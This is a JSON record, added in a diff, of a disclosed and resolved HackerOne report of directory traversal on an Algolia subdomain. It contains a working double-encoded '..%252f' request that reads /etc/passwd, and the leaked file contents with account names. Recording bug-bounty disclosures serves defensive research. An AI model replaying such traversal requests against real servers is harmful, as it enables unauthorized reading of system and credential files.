@@ -1,0 +1,149 @@
+{
+  "id": 333306,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzMzMDY=",
+  "url": "https://hackerone.com/reports/333306",
+  "title": "Directory traversal at https://msg.algolia.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-04-04T05:21:44.368Z",
+  "submitted_at": "2018-04-04T05:21:44.368Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "n00bsec",
+    "url": "/n00bsec",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/JT3BWCJ4xiJToE62okeB6trp/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 443,
+    "url": "https://hackerone.com/algolia",
+    "handle": "algolia",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Algolia",
+      "twitter_handle": "algolia",
+      "website": "https://algolia.com",
+      "about": "Hosted search API that delivers instant and relevant results from the first keystroke"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-06-09T18:26:07.542Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-05-10T18:25:57.076Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\nI was able to view the internal server files at https://msg.algolia.com.\nPlease see the attached screenshots for proof.\nI have tried to reproduce from within firefox and internet explorer without much luck however if you need it I will try to come up with a work around.\nFor reference the response header is as follows:\n--------------------------------------------------------------------------\nHTTP/1.1 200 OK\nDate: Wed, 04 Apr 2018 04:58:25 GMT\nContent-Type: text/plain; charset=utf-8\nConnection: close\nLast-Modified: Tue, 06 Jun 2017 09:15:37 GMT\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\nExpect-CT: max-age=604800, report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"\nServer: cloudflare\nCF-RAY: 4061331ffd53aa7a-SIN\nContent-Length: 1696\n-------------------------------------------------------------------------------------\nAnd here request to view directory traversal\nGET /static/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd HTTP/1.1\nHost: msg.algolia.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: id,en-US;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nCookie: __cfduid=d34587d94eba9413080d1f7aca5062a871522817854\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nResponse:\n\nHTTP/1.1 200 OK\nDate: Wed, 04 Apr 2018 04:58:25 GMT\nContent-Type: text/plain; charset=utf-8\nConnection: close\nLast-Modified: Tue, 06 Jun 2017 09:15:37 GMT\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\nExpect-CT: max-age=604800, report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"\nServer: cloudflare\nCF-RAY: 4061331ffd53aa7a-SIN\nContent-Length: 1696\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\nsyslog:x:104:108::/home/syslog:/bin/false\n_apt:x:105:65534::/nonexistent:/bin/false\nmessagebus:x:106:109::/var/run/dbus:/bin/false\nlxd:x:107:65534::/var/lib/lxd/:/bin/false\nuuidd:x:108:113::/run/uuidd:/bin/false\ndnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\npollinate:x:111:1::/var/cache/pollinate:/bin/false\nntp:x:112:116::/home/ntp:/bin/false\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\neranchetz:x:1001:1002::/home/eranchetz:/bin/bash\n\n## Impact\n\nwe can see sensitive information (ex. /etc/passwd) file",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 281726,
+      "file_name": "1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/281/726/98e69d13ee79d4d0ce9ce2c3f3c4d165c4e92a6a/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7R3Z7EMO%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T023320Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDdYdcUzJ7EtNSXHGrCTHURz6YGyVfcbWmCgLhGN3RzgwIgLA5V75%2FCsjjiasb5t8uwEm6Gofs6aOhta7HDD4YRARoqugUIov%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGcRrbQTN%2F9oCVgz2iqOBU1lcbD5ANeSeYRykFn1%2F77e7XQrKNpX%2BqxquMYVcjzD5KYR0fmfyylh8uQE3sACBBhCSlrHcf5W6AyhqMOtOHPjp3%2BeVFxo2SBtIcjB327KttOg4r2eM9Xojcy3id6qwWaA3ZZf2mGVXN6ocG5vxAFzv62%2BsFdMOTAhAMJiXL8vkMN%2F7xeYoZHY15igeqNA%2BxKLxI61NPDtH6uFOT25xM6L3Lvyyrb0JaRWmFVxSISUW8a97TDBD4ZXml8QuD7Oam7YsNYY7yGJztcBTPdiKRxnZsaB7LVLVMfeWE6s6iNEXBtcvI2vqEYgdSEoZ3ObKWZ1NENtWcu1ItBERzsqGz8UWhO5rkecYId1UTybhuYPPaAKVL501dqgEBGTIy%2BEtpjKenv2cwjKY0NUC3Yr6JZdPn7PNm3dYaZ8AUXio%2FzaF5TiNi74rGPgnx62uKWQYewpW%2F8DQgHbAEFLKFAYFhTSKu7wPrQmVTGM1seEq86mciftI36rGGLl3ZWX4Qt1SB%2FrKYeqJ8%2FFC9pWtLHleSo19y4E8Mq3UDrkeg2rDA2pFVnwXN8aaESvzTMrU1%2FOO90MD%2FR4CFNH%2Ff%2Fzc1ta08Ce6FcsXJcGHLGE07UpPQ0jgs5xXYH8y2cMT2d2i%2BRL3Cdb9oYSL%2F6UOZ%2BajIAE6aQ%2FLRmlZbb4AwdN1xuWfu8aoQKGCDewV29HD7jajoPOKgsLQVXN7zkXfRithKIMiXUBi2yShHYupn7kMBDQd6NT5NZU2G896dyQA4o%2BnotD0e6g9UY6xgxULsA2yuXLGgGKKj%2F0EoTfkcEKa8ZYJpTTL4sI%2BUoVDuMYtM78aG6S4c5UuR9phOUKk5mccOydLzKoFnIZeHMroEVwSaHDlDCli%2BTMBjqxAcoUnveMvBTuXdbcGH3Wbb01mnr1n%2Ff9G%2FdsdxnQKPl73M5NW7VxLX3gwC1NY2EiPmoc9aJFVopL1h6jK3Mj44CRq4ZwoEe3qmQFcNf3qhcDEs99CXZFOvdCy09PhXuIVkRZ9PD4rAEG%2F%2BVT2MCE7PRbNVu%2Fxrr60KTFncd1bBufas93sI5sULdNVq1%2FiMfZOBGAtN60zr9RuEnFf34MRWmUw0xLTUgHS%2BNs5zffQ2pkUg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=922dd2f270e8f64f6a857ce9be65b12c1f1af1e0ebb2e3f58f0b6120c751d904",
+      "file_size": 89617,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 281727,
+      "file_name": "2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/281/727/b78aba1079346290127c151c59d64714fbcc5916/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7R3Z7EMO%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T023320Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDdYdcUzJ7EtNSXHGrCTHURz6YGyVfcbWmCgLhGN3RzgwIgLA5V75%2FCsjjiasb5t8uwEm6Gofs6aOhta7HDD4YRARoqugUIov%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGcRrbQTN%2F9oCVgz2iqOBU1lcbD5ANeSeYRykFn1%2F77e7XQrKNpX%2BqxquMYVcjzD5KYR0fmfyylh8uQE3sACBBhCSlrHcf5W6AyhqMOtOHPjp3%2BeVFxo2SBtIcjB327KttOg4r2eM9Xojcy3id6qwWaA3ZZf2mGVXN6ocG5vxAFzv62%2BsFdMOTAhAMJiXL8vkMN%2F7xeYoZHY15igeqNA%2BxKLxI61NPDtH6uFOT25xM6L3Lvyyrb0JaRWmFVxSISUW8a97TDBD4ZXml8QuD7Oam7YsNYY7yGJztcBTPdiKRxnZsaB7LVLVMfeWE6s6iNEXBtcvI2vqEYgdSEoZ3ObKWZ1NENtWcu1ItBERzsqGz8UWhO5rkecYId1UTybhuYPPaAKVL501dqgEBGTIy%2BEtpjKenv2cwjKY0NUC3Yr6JZdPn7PNm3dYaZ8AUXio%2FzaF5TiNi74rGPgnx62uKWQYewpW%2F8DQgHbAEFLKFAYFhTSKu7wPrQmVTGM1seEq86mciftI36rGGLl3ZWX4Qt1SB%2FrKYeqJ8%2FFC9pWtLHleSo19y4E8Mq3UDrkeg2rDA2pFVnwXN8aaESvzTMrU1%2FOO90MD%2FR4CFNH%2Ff%2Fzc1ta08Ce6FcsXJcGHLGE07UpPQ0jgs5xXYH8y2cMT2d2i%2BRL3Cdb9oYSL%2F6UOZ%2BajIAE6aQ%2FLRmlZbb4AwdN1xuWfu8aoQKGCDewV29HD7jajoPOKgsLQVXN7zkXfRithKIMiXUBi2yShHYupn7kMBDQd6NT5NZU2G896dyQA4o%2BnotD0e6g9UY6xgxULsA2yuXLGgGKKj%2F0EoTfkcEKa8ZYJpTTL4sI%2BUoVDuMYtM78aG6S4c5UuR9phOUKk5mccOydLzKoFnIZeHMroEVwSaHDlDCli%2BTMBjqxAcoUnveMvBTuXdbcGH3Wbb01mnr1n%2Ff9G%2FdsdxnQKPl73M5NW7VxLX3gwC1NY2EiPmoc9aJFVopL1h6jK3Mj44CRq4ZwoEe3qmQFcNf3qhcDEs99CXZFOvdCy09PhXuIVkRZ9PD4rAEG%2F%2BVT2MCE7PRbNVu%2Fxrr60KTFncd1bBufas93sI5sULdNVq1%2FiMfZOBGAtN60zr9RuEnFf34MRWmUw0xLTUgHS%2BNs5zffQ2pkUg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4e808a7518c5e33ee95ac3cf81c657f155465e2c07e9ae4125802ba1372663ee",
+      "file_size": 38471,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 281728,
+      "file_name": "3.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/281/728/a90c7e23394eec62a6ae1049f90e2ceaebe7558d/3.png?response-content-disposition=attachment%3B%20filename%3D%223.png%22%3B%20filename%2A%3DUTF-8%27%273.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7R3Z7EMO%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T023320Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDdYdcUzJ7EtNSXHGrCTHURz6YGyVfcbWmCgLhGN3RzgwIgLA5V75%2FCsjjiasb5t8uwEm6Gofs6aOhta7HDD4YRARoqugUIov%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGcRrbQTN%2F9oCVgz2iqOBU1lcbD5ANeSeYRykFn1%2F77e7XQrKNpX%2BqxquMYVcjzD5KYR0fmfyylh8uQE3sACBBhCSlrHcf5W6AyhqMOtOHPjp3%2BeVFxo2SBtIcjB327KttOg4r2eM9Xojcy3id6qwWaA3ZZf2mGVXN6ocG5vxAFzv62%2BsFdMOTAhAMJiXL8vkMN%2F7xeYoZHY15igeqNA%2BxKLxI61NPDtH6uFOT25xM6L3Lvyyrb0JaRWmFVxSISUW8a97TDBD4ZXml8QuD7Oam7YsNYY7yGJztcBTPdiKRxnZsaB7LVLVMfeWE6s6iNEXBtcvI2vqEYgdSEoZ3ObKWZ1NENtWcu1ItBERzsqGz8UWhO5rkecYId1UTybhuYPPaAKVL501dqgEBGTIy%2BEtpjKenv2cwjKY0NUC3Yr6JZdPn7PNm3dYaZ8AUXio%2FzaF5TiNi74rGPgnx62uKWQYewpW%2F8DQgHbAEFLKFAYFhTSKu7wPrQmVTGM1seEq86mciftI36rGGLl3ZWX4Qt1SB%2FrKYeqJ8%2FFC9pWtLHleSo19y4E8Mq3UDrkeg2rDA2pFVnwXN8aaESvzTMrU1%2FOO90MD%2FR4CFNH%2Ff%2Fzc1ta08Ce6FcsXJcGHLGE07UpPQ0jgs5xXYH8y2cMT2d2i%2BRL3Cdb9oYSL%2F6UOZ%2BajIAE6aQ%2FLRmlZbb4AwdN1xuWfu8aoQKGCDewV29HD7jajoPOKgsLQVXN7zkXfRithKIMiXUBi2yShHYupn7kMBDQd6NT5NZU2G896dyQA4o%2BnotD0e6g9UY6xgxULsA2yuXLGgGKKj%2F0EoTfkcEKa8ZYJpTTL4sI%2BUoVDuMYtM78aG6S4c5UuR9phOUKk5mccOydLzKoFnIZeHMroEVwSaHDlDCli%2BTMBjqxAcoUnveMvBTuXdbcGH3Wbb01mnr1n%2Ff9G%2FdsdxnQKPl73M5NW7VxLX3gwC1NY2EiPmoc9aJFVopL1h6jK3Mj44CRq4ZwoEe3qmQFcNf3qhcDEs99CXZFOvdCy09PhXuIVkRZ9PD4rAEG%2F%2BVT2MCE7PRbNVu%2Fxrr60KTFncd1bBufas93sI5sULdNVq1%2FiMfZOBGAtN60zr9RuEnFf34MRWmUw0xLTUgHS%2BNs5zffQ2pkUg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e418e5d2ab97e470abd4d535cc0e9ff52bd1e1437eb441d4ac41112a88080ba8",
+      "file_size": 46495,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-06-09T18:25:57.192Z",
+  "allow_singular_disclosure_after": -243072443.21114114,
+  "singular_disclosure_allowed": true,
+  "vote_count": 33,
+  "voters": [
+    "pajoda",
+    "m4khn0",
+    "muon4",
+    "yumi",
+    "sameerphad72",
+    "ta8ahi",
+    "thalaivar304",
+    "savitar0x01",
+    "harrymg",
+    "apapedulimu",
+    "and 23 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 310,
+    "asset_type": "URL",
+    "asset_identifier": "www.algolia.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
